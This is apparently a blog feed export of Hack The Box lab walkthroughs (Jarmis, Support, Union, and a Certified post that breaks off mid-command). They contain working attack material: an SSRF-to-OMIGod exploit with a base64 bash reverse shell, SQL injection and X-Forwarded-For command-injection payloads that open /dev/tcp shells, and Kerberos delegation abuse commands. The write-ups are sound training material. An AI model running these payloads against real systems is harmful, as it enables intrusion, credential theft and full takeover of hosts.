--:--:-- --:--:-- --:--:-- 128 { \u0026#34;sig\u0026#34;: \u0026#34;00000000000000000000000000000000000000000000000000000000000000\u0026#34;, \u0026#34;endpoint\u0026#34;: \u0026#34;127.0.0.1:22\u0026#34;, \u0026#34;note\u0026#34;: \u0026#34;localhost\u0026#34; } Open Port: ‚ùØ curl \u0026#39;http://10.10.11.117/api/v1/fetch?endpoint=http%3A%2F%2Flocalhost:80\u0026#39; -H \u0026#39;accept: application/json\u0026#39; | jq % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 117 100 117 0 0 187 0 --:--:-- --:--:-- --:--:-- 187 { \u0026#34;sig\u0026#34;: \u0026#34;00000000000000000000000000000000000000000000000000000000000000\u0026#34;, \u0026#34;endpoint\u0026#34;: \u0026#34;127.0.0.1:80\u0026#34;, \u0026#34;note\u0026#34;: \u0026#34;localhost\u0026#34; } Closed Port ‚ùØ curl \u0026#39;http://jarmis.htb/api/v1/fetch?endpoint=http://localhost:21\u0026#39; -H \u0026#39;accept: application/json\u0026#39; | jq % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 109 100 109 0 0 110 0 --:--:-- --:--:-- --:--:-- 110 { \u0026#34;sig\u0026#34;: \u0026#34;00000000000000000000000000000000000000000000000000000000000000\u0026#34;, \u0026#34;endpoint\u0026#34;: \u0026#34;null\u0026#34;, \u0026#34;note\u0026#34;: \u0026#34;localhost\u0026#34; } As you can see if the port is open it includes 127.0.0.1 in the response else it gives the value null To automate this I could use bash script but it would be slower, So choosing the script below is not recommended #!/bin/bash BASE_URL=\u0026#34;http://jarmis.htb/api/v1/fetch\u0026#34; START_PORT=1 END_PORT=65535 for port in $(seq $START_PORT $END_PORT); do URL=\u0026#34;$BASE_URL?endpoint=http://localhost:$port\u0026#34; RESPONSE=$(curl -s \u0026#34;$URL\u0026#34; -H \u0026#39;accept: application/json\u0026#39; | jq -r \u0026#39;.endpoint\u0026#39;) if [[ \u0026#34;$RESPONSE\u0026#34; == \u0026#34;127.0.0.1:$port\u0026#34; ]]; then echo \u0026#34;Port $port is open\u0026#34; fi done So I used Fuff to scan ffuf -u \u0026#39;http://jarmis.htb/api/v1/fetch?endpoint=http://localhost:FUZZ\u0026#39; -w \u0026lt;(seq 1 65535) -t 60 -fr \u0026#39;\u0026#34;endpoint\u0026#34;:\u0026#34;null\u0026#34;\u0026#39; The results looks interesting for a Linux box 22 [Status: 200, Size: 117, Words: 1, Lines: 1, Duration: 446ms] 80 [Status: 200, Size: 117, Words: 1, Lines: 1, Duration: 333ms] 5986 [Status: 200, Size: 119, Words: 1, Lines: 1, Duration: 342ms] 8001 [Status: 200, Size: 119, Words: 1, Lines: 1, Duration: 368ms] 33028 [Status: 200, Size: 120, Words: 1, Lines: 1, Duration: 292ms] 55394 [Status: 200, Size: 120, Words: 1, Lines: 1, Duration: 332ms] Port 5986 and 5985 seems interesting particularly because in windows those ports are used by WinRM. In the ffuf scan I didn\u0026rsquo;t get port 5985 but I tested it manually. It took me 20 seconds to respond may be that\u0026rsquo;s why ffuf marked it as closed but anyway this port seems interesting. ‚ùØ curl \u0026#39;http://jarmis.htb/api/v1/fetch?endpoint=http://localhost:5985\u0026#39; -H \u0026#39;accept: application/json\u0026#39; | jq % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 119 100 119 0 0 5 0 0:00:23 0:00:20 0:00:03 27 { \u0026#34;sig\u0026#34;: \u0026#34;00000000000000000000000000000000000000000000000000000000000000\u0026#34;, \u0026#34;endpoint\u0026#34;: \u0026#34;127.0.0.1:5985\u0026#34;, \u0026#34;note\u0026#34;: \u0026#34;localhost\u0026#34; } Exploitation # CVE-2021-38647 # The port 5985 has Microsoft Open Management Infrastructure running we can exploit this service using CVE-2021-38647 and there is also a POC for this. But the POC just sends POST request to 5985 (Without TLS) or to 5986 (TLS included) Vulnerable part of this application is, Usually JARM sends 10 requests to verify and generate signature this part is known to us but here when the listener is malicious (i.e ismalicious=true) then JARM sends one extra request which is the 11th request. If we could get that request on listener then we could potentially modify it to use the exploit OMIGod(CVE-2021-38647). To achieve this we need to modify the Ip tables rules as proxy chains doesn\u0026rsquo;t support this level of precision Lets flush all the previous rules in the IP tables sudo iptables -t nat -F Then add this rule to redirect the 11th request from 443 to port 8443 sudo iptables -I PREROUTING -t nat -p tcp --dport 443 -m statistic --mode nth --every 11 --packet 10 -j REDIRECT --to-port 8443 Preparing the stage # To test this lets open two listeners, one on port 443 other on 8443 ncat --ssl -lnvp 443 for port 8443 ncat -ssl -lnvp 8443 I used fetch endpoint on my IP, and this worked very well On port 443 ‚ùØ ncat --ssl -lnvp 443 Ncat: Version 7.95 ( https://nmap.org/ncat ) Ncat: Generating a temporary 2048-bit RSA key. Use --ssl-key and --ssl-cert to use a permanent one. Ncat: SHA-1 fingerprint: 5B1D F737 C43E 3686 B058 EB4F 6C11 40B8 94DA 6CAD Ncat: Listening on [::]:443 Ncat: Listening on 0.0.0.0:443 Ncat: Connection from 10.10.11.117:56524. Ncat: Failed SSL connection from 10.10.11.117: error:0A000126:SSL routines::unexpected eof while reading Redirected 11th request from port 443 to 8443 ‚ùØ ncat --ssl -lnvp 8443 Ncat: Version 7.95 ( https://nmap.org/ncat ) Ncat: Generating a temporary 2048-bit RSA key. Use --ssl-key and --ssl-cert to use a permanent one. Ncat: SHA-1 fingerprint: 0B19 D1FA 27A0 86F1 D1AC 874E D599 8BF0 9DD1 9DD0 Ncat: Listening on [::]:8443 Ncat: Listening on 0.0.0.0:8443 Ncat: Connection from 10.10.11.117:56544. GET / HTTP/1.1 Host: 10.10.14.18 User-Agent: curl/7.74.0 Accept-Encoding: gzip, deflate Accept: */* Connection: keep-alive NCAT DEBUG: SSL_read error on 5: error:00000001:lib(0)::reason(1) Now we can exploit this using Gopher protocol. I have used this protocol before when doing Travel box, basically this protocol uses no headers thus perfect for delivering payloads I copied the payload data from the POC and after that I added curly braces replacing previous command data then included it into this python code. from flask import Flask, redirect from urllib.parse import quote app = Flask(__name__) DATA = \u0026#34;\u0026#34;\u0026#34;\u0026lt;s:Envelope xmlns:s=\u0026#34;http://www.w3.org/2003/05/soap-envelope\u0026#34; xmlns:a=\u0026#34;http://schemas.xmlsoap.org/ws/2004/08/addressing\u0026#34; xmlns:h=\u0026#34;http://schemas.microsoft.com/wbem/wsman/1/windows/shell\u0026#34; xmlns:n=\u0026#34;http://schemas.xmlsoap.org/ws/2004/09/enumeration\u0026#34; xmlns:p=\u0026#34;http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd\u0026#34; xmlns:w=\u0026#34;http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd\u0026#34; xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema\u0026#34;\u0026gt; \u0026lt;s:Header\u0026gt; \u0026lt;a:To\u0026gt;HTTP://192.168.1.1:5986/wsman/\u0026lt;/a:To\u0026gt; \u0026lt;w:ResourceURI s:mustUnderstand=\u0026#34;true\u0026#34;\u0026gt;http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem\u0026lt;/w:ResourceURI\u0026gt; \u0026lt;a:ReplyTo\u0026gt; \u0026lt;a:Address s:mustUnderstand=\u0026#34;true\u0026#34;\u0026gt;http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous\u0026lt;/a:Address\u0026gt; \u0026lt;/a:ReplyTo\u0026gt; \u0026lt;a:Action\u0026gt;http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem/ExecuteShellCommand\u0026lt;/a:Action\u0026gt; \u0026lt;w:MaxEnvelopeSize s:mustUnderstand=\u0026#34;true\u0026#34;\u0026gt;102400\u0026lt;/w:MaxEnvelopeSize\u0026gt; \u0026lt;a:MessageID\u0026gt;uuid:0AB58087-C2C3-0005-0000-000000010000\u0026lt;/a:MessageID\u0026gt; \u0026lt;w:OperationTimeout\u0026gt;PT1M30S\u0026lt;/w:OperationTimeout\u0026gt; \u0026lt;w:Locale xml:lang=\u0026#34;en-us\u0026#34; s:mustUnderstand=\u0026#34;false\u0026#34; /\u0026gt; \u0026lt;p:DataLocale xml:lang=\u0026#34;en-us\u0026#34; s:mustUnderstand=\u0026#34;false\u0026#34; /\u0026gt; \u0026lt;w:OptionSet s:mustUnderstand=\u0026#34;true\u0026#34; /\u0026gt; \u0026lt;w:SelectorSet\u0026gt; \u0026lt;w:Selector Name=\u0026#34;__cimnamespace\u0026#34;\u0026gt;root/scx\u0026lt;/w:Selector\u0026gt; \u0026lt;/w:SelectorSet\u0026gt; \u0026lt;/s:Header\u0026gt; \u0026lt;s:Body\u0026gt; \u0026lt;p:ExecuteShellCommand_INPUT xmlns:p=\u0026#34;http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem\u0026#34;\u0026gt; \u0026lt;p:command\u0026gt;{}\u0026lt;/p:command\u0026gt; \u0026lt;p:timeout\u0026gt;0\u0026lt;/p:timeout\u0026gt; \u0026lt;/p:ExecuteShellCommand_INPUT\u0026gt; \u0026lt;/s:Body\u0026gt; \u0026lt;/s:Envelope\u0026gt; \u0026#34;\u0026#34;\u0026#34; REQUEST = \u0026#34;\u0026#34;\u0026#34;POST / HTTP/1.1\\r Host: localhost:5985\\r User-Agent: curl/7.74.0\\r Content-Length: {length}\\r Content-Type: application/soap+xml;charset=UTF-8\\r \\r {body}\u0026#34;\u0026#34;\u0026#34; @app.route(\u0026#39;/\u0026#39;) def root(): cmd = \u0026#34;echo \u0026#39;YmFzaCAtYyAiZXhlYyBiYXNoIC1pICY+L2Rldi90Y3AvMTAuMTAuMTQuMTgvNjAwMSA8JjEiCg==\u0026#39; | base64 -d | bash\u0026#34; data = DATA.format(cmd) req = REQUEST.format(length=len(data)+2, body=data) enc_req = quote(req, safe=\u0026#39;\u0026#39;) return redirect(f\u0026#39;gopher://127.0.0.1:5985/_{enc_req}\u0026#39;, code=301) if __name__ == \u0026#34;__main__\u0026#34;: app.run(ssl_context=\u0026#39;adhoc\u0026#39;, debug=False, host=\u0026#34;0.0.0.0\u0026#34;, port=8443) I also included the base64 encoded reverse shell payload in the above python code echo \u0026#39;bash -c \u0026#34;exec bash -i \u0026amp;\u0026gt;/dev/tcp/10.10.14.18/6001 \u0026lt;\u0026amp;1\u0026#34;\u0026#39; | base64 Basically this python code will listen on 8443 and Upon receiving sends the request to target\u0026rsquo;s port 5985 with including malicious payload as data. Then the malicious payload will run the reverse shell. Performing the attack # Starting the python program python3 exp.py Starting the ncat listener on port 443 ncat --ssl -lnvp 443 Starting the reverse shell listener nc -lvnp 6001 As we already made the IP rule to redirect the 11th request from port 443 to port 8443. Now lets start the attack by using fetch endpoint pointing to our listener on port 443. ‚ùØ curl \u0026#39;http://10.10.11.117/api/v1/fetch?endpoint=http%3A%2F%2F10.10.14.18\u0026#39; | jq . % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 176 100 176 0 0 2 0 0:01:28 0:01:02 0:00:26 42 jq: parse error: Invalid numeric literal at line 1, column 7 Response from 443 listener: ‚ùØ ncat --ssl -lnvp 443 Ncat: Version 7.95 ( https://nmap.org/ncat ) Ncat: Generating a temporary 2048-bit RSA key. Use --ssl-key and --ssl-cert to use a permanent one. Ncat: SHA-1 fingerprint: 9834 084E 3280 ECD3 7580 D227 EA15 2E75 6E9F B3C4 Ncat: Listening on [::]:443 Ncat: Listening on 0.0.0.0:443 Ncat: Connection from 10.10.11.117:58228. Ncat: Failed SSL connection from 10.10.11.117: error:0A000126:SSL routines::unexpected eof while reading Response from the python listener: ‚ùØ python3 exp.py * Serving Flask app \u0026#39;exp\u0026#39; * Debug mode: on WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead. * Running on all addresses (0.0.0.0) * Running on https://127.0.0.1:8443 * Running on https://192.168.65.240:8443 Press CTRL+C to quit 10.10.11.117 - - [14/Mar/2025 23:55:13] \u0026#34;GET / HTTP/1.1\u0026#34; 301 - Got the reverse shell connection and secured both the User flag \u0026amp; Root flag ‚ùØ nc -lvnp 6001 listening on [any] 6001 ... connect to [10.10.14.18] from (UNKNOWN) [10.10.11.117] 53816 bash: cannot set terminal process group (17369): Inappropriate ioctl for device bash: no job control in this shell root@Jarmis:/var/opt/microsoft/scx/tmp# cd /root/ cd /root/ root@Jarmis:/root# cat root.txt cat root.txt e6d014840d\u0026lt;redacted\u0026gt; root@Jarmis:/root# ls /home ls /home htb root@Jarmis:/root# cat /home/htb/user.txt cat /home/htb/user.txt e2848e17\u0026lt;redacted\u0026gt; root@Jarmis:/root# ","date":"20 March 2025","externalUrl":null,"permalink":"/Secure-The-Throne/posts/1742061149402-jarmis-walkthroughhtb/","section":"Posts","summary":"","title":"Jarmis Walkthrough(Hack The Box)","type":"posts"},{"content":"","date":"18 March 2025","externalUrl":null,"permalink":"/Secure-The-Throne/tags/active-directory/","section":"Tags","summary":"","title":"Active Directory","type":"tags"},{"content":" About # Support is an Easy difficulty Windows machine that features an SMB share that allows anonymous authentication. After connecting to the share, an executable file is discovered that is used to query the machine\u0026amp;amp;amp;amp;#039;s LDAP server for available users. Through reverse engineering, network analysis or emulation, the password that the binary uses to bind the LDAP server is identified and can be used to make further LDAP queries. A user called support is identified in the users list, and the info field is found to contain his password, thus allowing for a WinRM connection to the machine. Once on the machine, domain information can be gathered through SharpHound, and BloodHound reveals that the Shared Support Accounts group that the support user is a member of, has GenericAll privileges on the Domain Controller. A Resource Based Constrained Delegation attack is performed, and a shell as NT Authority\\System is received. Reconnaissance \u0026amp; Enumeration # The port scan reveals multiple open ports As always we got LDAP, Netbios, SMB etc ports open Using smbclient I enumerated for smb shares and we got the share list smbclient -L support.htb However the interesting share here is support-tools. Using netexec I confirmed the guest login and it was a success netexec smb support.htb -u sundeity -p \u0026#34;\u0026#34; I enumerated for guest shares and we got access to two shares netexec smb support.htb -u sundeity -p \u0026#34;\u0026#34; --shares So I checked the share support-tools and as the name suggests we got some tools inside the directory. Most of the tools are familiar to me aleast their names are familiar I decided to enumerate all the zips from the share. Initially the zips didn\u0026rsquo;t provide me with anything interesting so I moved on to enumerate LDAP. nmap -n -sV --script \u0026#34;ldap* and not brute\u0026#34; -p 389 support.htb Then I enumerated for users using netexec from smb and got the users list Removed all unwanted texts from the list cat users.txt | grep \u0026#34;SidTypeUser\u0026#34; | cut -d \u0026#39;\\\u0026#39; -f 2 | cut -d \u0026#39;(\u0026#39; -f 1 \u0026gt;\u0026gt; users-smb.txt I Stored the users in a file. UsersInfo.exe analysis # Remember the file UsersInfo.exe.zip that we have downloaded from SMB share. At first I didn\u0026rsquo;t notice it but after a while I was stuck and then I only I realized the unfamiliar tool among the known tools within the share On running UsersInfo.exe with wine I can see it, authenticate to ldap for retrieving the user that we requested by that this tool checks if that particular user available in the DC or not, then it returns the statement accordingly. For an example the tool returned me a error No such object meaning the requested user cannot be found within LDAP\nThis tool doesn\u0026rsquo;t use any encryption to login against LDAP thus leaves the password used for authentication in clear text .If I can capture the traffic in wireshark I can get the password. In the LDAP I can see it authenticate as user ldap with the password. As I got a username and password I can now collect data for bloodhound Getting data for Bloodhound Exploitation # If we search the results of ldapsearch , particularly in the info field I can get another password. Which is new to me cause I never seen anything sensitive in an info field. ldapsearch -H ldap://support.htb -D \u0026#39;ldap@support.htb\u0026#39; -w \u0026#39;\u0026lt;password\u0026#39; -b \u0026#34;DC=support,DC=htb\u0026#34; | grep \u0026#34;info\u0026#34; In LDAP I got this password from the user support@support.htb I checked the bloodhound data, and user support is member of three groups For a change I used crackmapexec to password spray, eventually it confirms the password for support user crackmapexec winrm support.htb -u users-smb.txt -p \u0026lt;password\u0026gt; Using the newly dicovered password I logged into winrm via evilwinrm as user support evil-winrm -u support -p \u0026#39;\u0026lt;password\u0026gt;\u0026#39; -i support.htb Got the User flag Privilege Escalation # If we see, user support is in a group called Shared Support Accounts@Support.htb . That group have Generic all permissions over Domain controller Itself. This privilege allows the trustee to manipulate the target object however they wish. Abusing GenericALL # We can abuse this by the help instructions in Bloodhound for this Privilege. Here I am going to create a Fake computer under my control and that will act as DC to get kerberos ticket. Follow the steps below carefully Required Tools PowersView.ps1 Powermad.ps1 Rubeus.exe(Pre build from SharpCollection) Step 1: Upload all the tools to the target system, then # Do the following in the winrm shell cd C:\\\\programdata\nupload PowersView.ps1\nupload Powermad.ps1\nupload Rubeus.exe\nStep 2: Invoking all the scripts # . .\\PowerView.ps1 . .\\Powermad.ps1 Step 3: Creating a Fake Computer # New-MachineAccount -MachineAccount \u0026lt;Computername\u0026gt; -Password $(ConvertTo-SecureString \u0026#39;\u0026lt;Password\u0026gt;\u0026#39; -AsPlainText -Force) We need SID of the computer that we have created earlier, so that we can assign that value to a variable $fakesid = Get-DomainComputer \u0026lt;Computername\u0026gt; | select -expand objectsid Step 4: Configuring # Now I‚Äôll configure the DC to trust my fake computer to make authorization decisions on it‚Äôs behalf. These commands will create an ACL with the fake computer‚Äôs SID and assign that to the DC Definition What is ACL? An ACL is a list of access control entries (ACEs) that define permissions for users or groups to access specific objects (like users, groups, computers, or organizational units) and their attributes. Purpose: ACLs ensure that only authorized users can access specific resources and perform specific actions, enhancing security and data protection.\n$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList \u0026#34;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($fakesid))\u0026#34; $SDBytes = New-Object byte[] ($SD.BinaryLength) $SD.GetBinaryForm($SDBytes, 0) Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{\u0026#39;msds-allowedtoactonbehalfofotheridentity\u0026#39;=$SDBytes} Step 5: Auth as the Computer # .\\Rubeus.exe hash /password:\u0026lt;Password\u0026gt; /user:\u0026lt;ComputerName\u0026gt; /domain:support.htb Now copy the rc4_hmac hash from the output Step 6: Get the Kerberos Ticket # .\\Rubeus.exe s4u /user:\u0026lt;Computername\u0026gt;$ /rc4:\u0026lt;Hash\u0026gt; /impersonateuser:administrator /msdsspn:cifs/dc.support.htb /ptt Now ticket will be captured. We can see the base64 encoded ticket Copy the ticket for Administrator and put in a file called ticket.kirbi.b64 Remove all the whitespaces and unwanted lines, I done this in vim using this command :%s/\\s\\+//g Now decode the base64 into a different file base64 -d tick.kirbi.b64 \u0026gt; ticket.kirbi For linux operating systems we have to convert the ticket from kirbi to ccache, for passing the ticket We can easily convert this using ticketConverter.py. It\u0026rsquo;s one of the tool from Impacket tool kit. sudo /home/n_emperor/.local/share/pipx/venvs/netexec/bin/ticketConverter.py ticket.kirbi ticket.ccache Now Pass the ticket and spawn a shell KRB5CCNAME=ticket.ccache psexec.py support.htb/administrator@dc.support.htb -k -no-pass End # Secured the Root flag ","date":"18 March 2025","externalUrl":null,"permalink":"/Secure-The-Throne/posts/1741895312886-support-walkthroughhtb/","section":"Posts","summary":"","title":"Support Walkthrough(Hack The Box)","type":"posts"},{"content":"","date":"18 March 2025","externalUrl":null,"permalink":"/Secure-The-Throne/tags/windows/","section":"Tags","summary":"","title":"Windows","type":"tags"},{"content":"","date":"16 March 2025","externalUrl":null,"permalink":"/Secure-The-Throne/tags/medium/","section":"Tags","summary":"","title":"Medium","type":"tags"},{"content":" Reconnaissance \u0026amp; Enumeration # Nmap scan results PORT STATE SERVICE VERSION 80/tcp open http nginx 1.18.0 (Ubuntu) | http-methods: |_ Supported Methods: GET HEAD POST | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: Site doesn\u0026#39;t have a title (text/html; charset=UTF-8). Interesting isn\u0026rsquo;t it, we got only one port-80 open In the scan itslef we can see the PHPSESSID cookie, So, this is a PHP made website I eventually got bored looking at the website so fired up a subdomain scan and got no results After many unsuccessful attempts, as this is a PHP website I convinced myself to run a directory fuzzing with php extension ffuf -u http://union.htb/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -e .php -t 60 Got some interesting results firewall.php seems interesting but on accessing the page it\u0026rsquo;s throwing errors, just now I was happy This website has a Username check option if the username is valid or did not present in the database then It will provide a link to challenge.php, there we have to submit some kind of flag. This is how the website works This username check parameter seems to be vulnerable to SQL injection. If you have no idea about SQL Injection, I have a small post for that, first check that and then come back here. SQl-Injection 7 March 2025\u0026middot;177 words\u0026middot;1 min Hacking Server Web When I input this payload I got different error \u0026#39;OR 1=1; -- - There is a firewall running on this web page so SQLMap will not work, Thus we have to do all the work manually While I was spamming with SQLi payloads I got an Interesting response for this payload \u0026#39; UNION select user(); -- - To get the Info about databases, We can use this payload \u0026#39; UNION select group_concat(SCHEMA_NAME) from INFORMATION_SCHEMA.schemata; -- - Output: Sorry, mysql,information_schema,performance_schema,sys,november you are not eligible due to already qualifying. We got five databases in the corresponding response but november seems more interesting, So lets see what\u0026rsquo;s inside of it \u0026#39; UNION select group_concat(table_name) from INFORMATION_SCHEMA.tables where table_schema=\u0026#39;november\u0026#39;; -- - Output: Sorry, flag,players you are not eligible due to already qualifying. We got what we needed november database has two tables, lets go further in \u0026#39; UNION select group_concat(table_name, \u0026#39;:\u0026#39;, column_name) from INFORMATION_SCHEMA.columns where table_schema=\u0026#39;november\u0026#39;; -- - Output: Sorry, flag:one,players:player you are not eligible due to already qualifying. Each of the tables had only one column. For now I am going for flag table. Let\u0026rsquo;s see\u0026hellip; \u0026#39; UNION select group_concat(one) from flag; -- - Output: Sorry, \u0026lt;redacted\u0026gt; you are not eligible due to already qualifying. I Got the flag not the Hack The Box user flag but the platform flag for this box and after submission of the flag, the website firewalls lifted and port 22 is now accessible Lets confirm this by a simple nmap scan on port 22 ‚ùØ nmap -p 22 -A 10.10.11.128 Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-12 23:42 IST Nmap scan report for union.htb (10.10.11.128) Host is up (0.18s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 ea:84:21:a3:22:4a:7d:f9:b5:25:51:79:83:a4:f5:f2 (RSA) | 256 b8:39:9e:f4:88:be:aa:01:73:2d:10:fb:44:7f:84:61 (ECDSA) |_ 256 22:21:e9:f4:85:90:87:45:16:1f:73:36:41:ee:3b:32 (ED25519) Ok now let\u0026rsquo;s continue with the SQLi, first I checked for the other tables and got the users info \u0026#39; UNION select group_concat(player) from players; -- - Output: Sorry, ippsec,celesian,big0us,luska,tinyboy you are not eligible due to already qualifying. Exploitation # This is one of the reasons why sql injection is so dangerous we can read system files using SQLi if it\u0026rsquo;s misconfigured. Using the below payload I got the /etc/passwd file data \u0026#39; UNION select load_file(\u0026#39;/etc/passwd\u0026#39;); -- - Output: Sorry, root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin pollinate:x:110:1::/var/cache/pollinate:/bin/false usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin sshd:x:112:65534::/run/sshd:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin htb:x:1000:1000:htb:/home/htb:/bin/bash lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false mysql:x:109:117:MySQL Server,,,:/nonexistent:/bin/false uhc:x:1001:1001:,,,:/home/uhc:/bin/bash you are not eligible due to already qualifying. From reading the /etc/passwd file I identified three valid users to access the system\nWe can also read the source code of this page\n\u0026#39; UNION select load_file(\u0026#39;/var/www/html/index.php\u0026#39;); -- - If you remember earlier we found config.php via the directory fuzzing, so let\u0026rsquo;s try getting it \u0026#39; UNION select load_file(\u0026#39;/var/www/html/config.php\u0026#39;); -- - Output: Sorry, \u0026lt;?php session_start(); $servername = \u0026#34;127.0.0.1\u0026#34;; $username = \u0026#34;uhc\u0026#34;; $password = \u0026#34;\u0026lt;redacted\u0026gt;\u0026#34;; $dbname = \u0026#34;november\u0026#34;; $conn = new mysqli($servername, $username, $password, $dbname); ?\u0026gt; you are not eligible due to already qualifying. We got the exposed password from the website configuration. Accessed the system using SSH and got the user flag Privilege Escalation # Quickly I started enumerating and eventually looked into the firewall.php code and I can see the vulnerable code \u0026lt;?php if (isset($_SERVER[\u0026#39;HTTP_X_FORWARDED_FOR\u0026#39;])) { $ip = $_SERVER[\u0026#39;HTTP_X_FORWARDED_FOR\u0026#39;]; } else { $ip = $_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;]; }; system(\u0026#34;sudo /usr/sbin/iptables -A INPUT -s \u0026#34; . $ip . \u0026#34; -j ACCEPT\u0026#34;); ?\u0026gt; This above part is vulnerable to command Injection, after a while I pictured the payload and I tested with this header payload and it worked X-FORWARDED-FOR: 8.8.8.8; wget http://10.10.14.4:8000/Union_AllPorts.txt; Prepared a reverse shell payload and got the shell with this X-FORWARDED-FOR: 8.8.8.8; bash -c \u0026#39;exec bash -i \u0026amp;\u0026gt;/dev/tcp/10.10.14.4/6001 \u0026lt;\u0026amp;1\u0026#39;; Upgraded the shell to be more stable using a new technique that I have learnt recently script /dev/null -c bash Then foreground the shell with CTRL+Z stty raw -echo; fg In the shell type this to allign it with our terminal reset Now the shell is upgraded Issued this command sudo -l and found that sudo can be run with anything Now easily ran the bash with root privileges sudo /bin/bash Got the Root flag ","date":"16 March 2025","externalUrl":null,"permalink":"/Secure-The-Throne/posts/1741809498520-union-walkthroughhtb/","section":"Posts","summary":"","title":"Union Walkthrough(Hack The Box)","type":"posts"},{"content":" Reconnaissance # We got multiple ports open, Which is interesting Out of curiosity I fired up a nmap scan and it turns out there are other ports open too For this box they gave credentials as well Username: judith.mader Password: judith09 Total open ports: Open 10.10.11.41:53 Open 10.10.11.41:88 Open 10.10.11.41:135 Open 10.10.11.41:139 Open 10.10.11.41:389 Open 10.10.11.41:445 Open 10.10.11.41:464 Open 10.10.11.41:593 Open 10.10.11.41:636 Open 10.10.11.41:3268 Open 10.10.11.41:3269 Open 10.10.11.41:5985 Open 10.10.11.41:9389 Open 10.10.11.41:49668 Open 10.10.11.41:49666 Open 10.10.11.41:49673 Open 10.10.11.41:49674 Open 10.10.11.41:49683 Open 10.10.11.41:49716 Open 10.10.11.41:49739 Open 10.10.11.41:59780 Enumeration # As usual for starters I checked the smb shares of user judith netexec smb certified.htb -u judith.mader -p judith09 --shares Smb shares for this user, didn\u0026rsquo;t had anything intersting. As usual I enumerated users from SMB netexec smb certified.htb -u judith.mader -p judith09 --rid-brute \u0026gt;\u0026gt; users-earlier.txt Removed the unnecessary fields from the netexec output cat users-earlier.txt| grep \u0026#34;SidTypeUser\u0026#34; | cut -d \u0026#39;\\\u0026#39; -f 2 | cut -d \u0026#39;(\u0026#39; -f 1 \u0026gt;\u0026gt; users.txt Then I testing for password reuse using password sprying attack netexec smb certified.htb -u users.txt -p judith09 --continue-on-success Got nothing useful, seems It\u0026rsquo;s not that easy Searched LDAP for anything interesting and found nothing ldapsearch -H ldap://certified.htb -D \u0026#39;judith.mader@certified.htb\u0026#39; -w \u0026#39;judith09\u0026#39; -b \u0026#34;DC=certified,DC=htb\u0026#34; | grep \u0026#34;pass\u0026#34; So atlast I collected bloodhound data bloodhound-python -c ALL -u judith.mader -p judith09 -d certified.htb -ns 10.10.11.41 While analyzing the data I found Interesting things These are my findings: The user Judith has WriteOwner permissions over group MANAGEMENT@CERTIFIED.Hack The Box The group Management@certified.htb has Generic all permission over user management_svc@certified.htb The user MANAGEMENT_SVC@CERTIFIED.Hack The Box has CanPsRemote permission on the Domain controller(This is not quite useful. At the end we will be abusing AD CS instead of this) Exploitation # Time is very crucial for these kind of attacks so synced the time with the target system sudo rdate -n certified.htb WriteOwner Abuse # First we need to be an user of MANAGEMENT@CERTIFIED.Hack The Box Using this command, I can change the ownership of the object to the user which I own owneredit.py -action write -new-owner \u0026#39;judith.mader\u0026#39; -target \u0026#39;Management\u0026#39; \u0026#39;certified.htb/judith.mader:judith09\u0026#39; To abuse ownership of a group object, I need to grant myself the AddMember privilege. Impacket\u0026rsquo;s dacledit can be used for this purpose dacledit.py -action \u0026#39;write\u0026#39; -rights 